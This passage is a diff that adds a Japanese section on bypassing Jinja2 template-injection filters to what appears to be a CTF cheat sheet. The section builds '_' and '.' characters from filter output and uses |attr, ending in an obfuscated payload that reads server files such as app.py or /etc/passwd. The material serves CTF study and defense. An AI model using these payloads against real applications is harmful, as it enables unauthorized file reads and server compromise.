@@ -1280,6 +1280,32 @@ Internal Server Error
 - `{{''.class.mro()[1].subclasses()}}`   
 
 #### filter bypass
+`.`が使えないときは`|attr`でフィルタと`attr`を使ってバイパスできる。  
+```txt
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+
+{{string|attr(class)}}
+```
+`{{ [[]|map|string|list][0][20] }}`で`_`,`{{ [1|float|string|list][0][1] }}`で`.`を表せる。  
+```txt
+{{ [] }}   []
+{{ [[]|map] }}   [<generator object do_map at 0x7f203808ce08>]
+{{ [[]|map|string] }}   ['<generator object do_map at 0x7f202367f4c0>']
+{{ [[]|map|string|list] }} [['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 'd', 'o', '_', 'm', 'a', 'p', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', '2', '0', '2', '3', '6', '7', 'f', '4', 'c', '0', '>']]
+{{ [[]|map|string|list][0] }} ['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 'd', 'o', '_', 'm', 'a', 'p', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', '2', '0', '2', '3', '6', '7', 'f', '4', 'c', '0', '>']
+
+{{ [1] }}   [1]
+{{ [1|float] }}  [1.0]
+{{ [1|float|string] }} ['1.0']
+{{ [1|float|string|list] }}  [['1', '.', '0']]
+{{ [1|float|string|list][0] }} ['1', '.', '0']
+{{ [1|float|string|list][0][1] }} .
+```
+`''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()`みたいなのは以下と同等。  
+```txt
+{{ [[''|attr([[[]|map|string|list][0][20]*2,'class',[[]|map|string|list][0][20]*2]|join)|attr([[[]|map|string|list][0][20]*2,'mro',[[]|map|string|list][0][20]*2]|join)][0][1]|attr([[[]|map|string|list][0][20]*2,'subclasses',[[]|map|string|list][0][20]*2]|join)()][0][40](['app', [1|float|string|list][0][1], 'py']|join,'r')|attr('read')() }}
+```
 https://medium.com/bugbountywriteup/x-mas-2019-ctf-write-up-mercenary-hat-factory-ssti-53e82d58829e   
 https://ctftime.org/writeup/10895   
 https://0day.work/jinja2-template-injection-filter-bypasses/   
